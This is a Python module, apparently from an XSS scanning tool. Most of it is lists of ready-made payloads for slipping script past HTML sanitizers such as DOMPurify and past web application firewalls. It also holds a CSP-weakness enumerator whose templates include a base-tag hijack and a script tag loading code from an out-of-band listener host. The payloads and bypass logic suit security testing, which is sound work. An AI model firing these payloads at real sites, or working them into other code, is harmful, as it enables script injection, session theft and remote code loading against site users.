"""XSS tier-2: sanitizer mutation bypass, CSP bypass enumeration, WAF
XSS defeat payloads.

Three capabilities, all additive on top of xss_pack / dom_xss:

  detect_sanitizer(bundle_text) -> classification dict
    Detects DOMPurify / sanitize-html / xss-filters style presence from a
    JS bundle. Returns "unknown" if bundle_text is empty.

  enumerate_csp_bypasses(csp_header) -> [bypass dicts]
    Given a Content-Security-Policy header, returns concrete bypass
    classes with a payload template per weakness. Reuses dom_xss's
    _csp_analysis for the base verdict; adds actionable payloads.

  MUTATION_CLASSES / WAF_DEFEATS -> payload packs
    Mutation payloads for DOMPurify sanitizer bypasses (namespace
    confusion, <template>, is=, comment quirks, CDATA, <form> double
    nesting). WAF defeat payloads ordered by filter-probability
    (low-frequency event handlers, attribute tricks, entity overlongs).

Verdict on any XSS claim requires Playwright execution (proven by
xss_t2.scan calling into the shared browser execution flow). Reflection
alone is not a verdict.
"""
from __future__ import annotations

import re


MUTATION_CLASSES = {
    "namespace_confusion": [
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        "<math><mtext><table><mglyph><style>"
        "<!--</style><img src=x onerror=alert(1)>",
        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
        "<math><annotation-xml encoding=\"text/html\">"
        "<script>alert(1)</script></annotation-xml></math>",
    ],
    "template_nesting": [
        "<template><script>alert(1)</script></template>",
        "<template><template><img src=x onerror=alert(1)></template></template>",
        "<form><template><script>alert(1)</script></template></form>",
    ],
    "is_attribute": [
        "<div is=x><script>alert(1)</script></div>",
        "<p is=svg><script>alert(1)</script></p>",
    ],
    "comment_quirks": [
        "<!--><img src=x onerror=alert(1)>",
        "<!-- --><img src=x onerror=alert(1)>",
        "<!-- --!><svg onload=alert(1)>",
        "<!----><img src=x onerror=alert(1)>",
    ],
    "cdata_in_html": [
        "<![CDATA[<img src=x onerror=alert(1)>]]>",
        "<![CDATA[><img src=x onerror=alert(1)>]]>",
    ],
    "form_double_nesting": [
        "<form><form><img src=x onerror=alert(1)></form></form>",
        "<form><math><mtext></form><form><mglyph>"
        "<svg><script>alert(1)</script></svg>",
    ],
}


WAF_DEFEATS = {
    "low_frequency_handlers": [
        "onpointerdown", "onpointerenter", "onpointerup",
        "onanimationend", "onanimationstart", "onanimationiteration",
        "ontransitionend", "ontransitionrun", "ontransitionstart",
        "onbeforetoggle", "onbeforematch", "onbeforeinput",
        "onsecuritypolicyviolation", "onslotchange", "onscrollend",
        "onformdata", "oncopy", "oncut", "onpaste", "oncontextmenu",
        "onauxclick", "ondblclick", "onmousewheel", "onwheel",
        "onhashchange", "ononline", "onoffline", "onpageshow",
        "onpagehide", "onpopstate", "onrejectionhandled",
        "onunhandledrejection", "onstorage", "onclose", "onerror",
        "onmessage", "onmessageerror",
    ],
    "svg_foreignobject": [
        "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    ],
    "scheme_tab_newline": [
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "java\rscript:alert(1)",
        "jav&#x09;ascript:alert(1)",
        "jav&#x0a;ascript:alert(1)",
    ],
    "entity_overlong": [
        "&#x0003C;img src=x onerror=alert(1)&#x0003E;",
        "&#00000000000060;script&#00000000000062;alert(1)&#00000000000060;/script&#00000000000062;",
    ],
    "attr_name_insertion": [
        "<img/src=x/onerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "<img src=x onerror=alert(1) //>",
    ],
    "html5_entities": [
        "<a href=\"javascript&colon;alert(1)\">x</a>",
        "<a href=\"javascript&#x3a;alert(1)\">x</a>",
        "<a href=\"javascript&#58;alert(1)\">x</a>",
    ],
    "custom_element": [
        "<x onclick=alert(1)>click</x>",
        "<x-foo onclick=alert(1)>click</x-foo>",
        "<x-y-z onclick=alert(1) autofocus tabindex=0>",
    ],
}


SIGNAL = {}
for _cls, _ps in MUTATION_CLASSES.items():
    for _p in _ps:
        SIGNAL[_p] = {"kind": "exec", "verdict": "VULNERABLE",
                       "class": _cls}
for _cls, _ps in WAF_DEFEATS.items():
    if _cls == "low_frequency_handlers":
        for _h in _ps:
            _p = "<x %s=alert(1) autofocus tabindex=0>" % _h
            SIGNAL[_p] = {"kind": "exec", "verdict": "VULNERABLE",
                           "class": _cls}
    else:
        for _p in _ps:
            SIGNAL[_p] = {"kind": "exec", "verdict": "VULNERABLE",
                           "class": _cls}


def all_mutation_payloads():
    out = []
    for label, items in MUTATION_CLASSES.items():
        for p in items:
            out.append((label, p))
    return out


def all_waf_defeats():
    out = []
    for label, items in WAF_DEFEATS.items():
        if label == "low_frequency_handlers":
            for h in items:
                out.append((label + ":" + h,
                             "<x %s=alert(1) autofocus tabindex=0>" % h))
        else:
            for p in items:
                out.append((label, p))
    return out


def all_tier2_payloads():
    """Return [(class_label, payload)] for both mutation + waf-defeat."""
    return all_mutation_payloads() + all_waf_defeats()


_SANITIZER_SIGNATURES = [
    ("dompurify", [
        r"DOMPurify", r"dompurify", r"\.sanitize\s*\(",
        r"ALLOWED_TAGS\s*:",
    ]),
    ("sanitize-html", [
        r"sanitize-html", r"require\(['\"]sanitize-html",
        r"from\s+['\"]sanitize-html",
    ]),
    ("xss-filters", [
        r"xss-filters", r"xssFilters",
    ]),
    ("js-xss", [
        r"js-xss", r"filterXSS", r"xss\s*\(\s*",
    ]),
    ("clean-html", [
        r"clean-html",
    ]),
]


def detect_sanitizer(bundle_text):
    """Classify the client-side sanitizer from a JS bundle.

    Returns {name, confidence, evidence} with name="unknown" when nothing
    matched or no bundle_text was provided.
    """
    if not bundle_text:
        return {"name": "unknown", "confidence": 0.0, "evidence": []}
    hits = []
    for name, patterns in _SANITIZER_SIGNATURES:
        for pat in patterns:
            m = re.search(pat, bundle_text, re.IGNORECASE)
            if m:
                hits.append({"name": name, "pattern": pat,
                              "match": m.group(0)[:80]})
                break
    if not hits:
        return {"name": "unknown", "confidence": 0.0, "evidence": []}
    top = hits[0]
    confidence = min(0.95, 0.5 + 0.15 * len(hits))
    return {"name": top["name"], "confidence": round(confidence, 2),
            "evidence": hits}


# --- CSP bypass enumeration -----------------------------------------------

_CSP_BYPASS_TEMPLATES = {
    "missing_base_uri": {
        "class": "missing_base_uri",
        "payload_template": "<base href=\"//{listener}/\">",
        "confidence": 0.7,
    },
    "missing_object_src": {
        "class": "missing_object_src",
        "payload_template": "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "confidence": 0.75,
    },
    "unsafe_eval": {
        "class": "unsafe_eval",
        "payload_template": "eval('alert(1)')",
        "confidence": 0.8,
    },
    "unsafe_inline": {
        "class": "unsafe_inline",
        "payload_template": "<script>alert(1)</script>",
        "confidence": 0.85,
    },
    "wildcard_script_src": {
        "class": "wildcard_script_src",
        "payload_template": "<script src=\"//{listener}/x.js\"></script>",
        "confidence": 0.8,
    },
    "data_uri_script": {
        "class": "data_uri_script",
        "payload_template": "<script src=\"data:,alert(1)\"></script>",
        "confidence": 0.8,
    },
    "strict_dynamic": {
        "class": "strict_dynamic",
        "payload_template": "(uses a whitelisted bundle's document.write/eval sink)",
        "confidence": 0.5,
    },
    "jsonp_host_in_script_src": {
        "class": "jsonp_host_in_script_src",
        "payload_template": "<script src=\"//jsonp.example.com/cb?callback=alert\"></script>",
        "confidence": 0.75,
    },
    "path_prefix_allowlist": {
        "class": "path_prefix_allowlist",
        "payload_template": "<script src=\"/libs/../api/x.js\"></script>",
        "confidence": 0.6,
    },
}


def _parse_csp(csp_header):
    if not csp_header:
        return {}
    out = {}
    for part in csp_header.split(";"):
        part = part.strip()
        if not part:
            continue
        bits = part.split(None, 1)
        name = bits[0].lower()
        vals = bits[1].split() if len(bits) > 1 else []
        out[name] = vals
    return out


def enumerate_csp_bypasses(csp_header):
    """Return a list of concrete bypass classes for a given CSP header.

    Each entry: {class, weakness, payload_template, confidence}.
    Empty list when CSP is genuinely tight OR not present at all
    (a missing CSP is a separate finding, not a bypass).
    """
    if not csp_header:
        return []
    directives = _parse_csp(csp_header)
    script_src = (directives.get("script-src")
                  or directives.get("default-src") or [])
    script_src_l = [s.lower() for s in script_src]
    out = []

    def add(weakness_key):
        tpl = _CSP_BYPASS_TEMPLATES.get(weakness_key)
        if not tpl:
            return
        out.append(dict(tpl))

    if "base-uri" not in directives:
        add("missing_base_uri")
    if "object-src" not in directives:
        add("missing_object_src")
    if "'unsafe-eval'" in script_src_l:
        add("unsafe_eval")
    if ("'unsafe-inline'" in script_src_l
            and "'strict-dynamic'" not in script_src_l
            and not any(s.startswith("'nonce-") for s in script_src_l)
            and not any(s.startswith("'sha") for s in script_src_l)):
        add("unsafe_inline")
    if "*" in script_src:
        add("wildcard_script_src")
    if "data:" in script_src_l:
        add("data_uri_script")
    if "'strict-dynamic'" in script_src_l:
        add("strict_dynamic")
    if any("jsonp" in s.lower() or "callback" in s.lower()
            for s in script_src):
        add("jsonp_host_in_script_src")
    if any("/libs/" in s or "/static/" in s for s in script_src):
        add("path_prefix_allowlist")
    return out


def render_csp_bypass_payloads(bypasses, listener="oob.listener"):
    """Substitute the {listener} placeholder into each template."""
    out = []
    for b in bypasses or []:
        tpl = b.get("payload_template") or ""
        payload = tpl.replace("{listener}", listener)
        out.append({"class": b["class"], "payload": payload,
                     "confidence": b.get("confidence", 0.5)})
    return out
